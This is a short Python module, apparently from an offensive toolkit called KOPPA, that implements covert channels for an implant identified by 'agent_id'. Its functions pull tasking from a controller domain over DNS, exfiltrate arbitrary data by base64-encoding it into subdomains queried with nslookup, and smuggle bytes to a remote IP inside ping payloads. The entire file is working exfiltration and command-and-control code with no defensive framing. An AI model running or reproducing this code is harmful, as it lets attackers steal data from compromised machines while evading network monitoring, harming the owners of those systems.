"""KOPPA stdlib: covert — covert channels (DNS, ICMP, HTTP)"""
import subprocess, base64, socket, time

def dns_receive(domain, agent_id):
    try:
        result = socket.getaddrinfo(f"task.{agent_id}.{domain}", None)
        if result: return base64.b64decode(result[0][4][0].replace(".", "")).decode(errors="replace")
    except Exception:
        pass
    return ""

def dns_exfil(data, domain, agent_id, chunk=20):
    if isinstance(data, str): data = data.encode()
    chunks = [data[i:i+chunk] for i in range(0, len(data), chunk)]
    for i, chunk_data in enumerate(chunks):
        enc = base64.b64encode(chunk_data).decode().rstrip("=")
        subdomain = f"{enc}.{i}.{agent_id}.{domain}"
        try:
            subprocess.run(["nslookup", subdomain], capture_output=True, timeout=5)
        except Exception:
            pass
        time.sleep(0.2)

def icmp_send(dest_ip, data):
    if isinstance(data, str): data = data.encode()
    try:
        subprocess.run(
            ["ping", "-c", "1", "-p", data[:16].hex(), dest_ip],
            capture_output=True, timeout=10
        )
    except Exception:
        pass
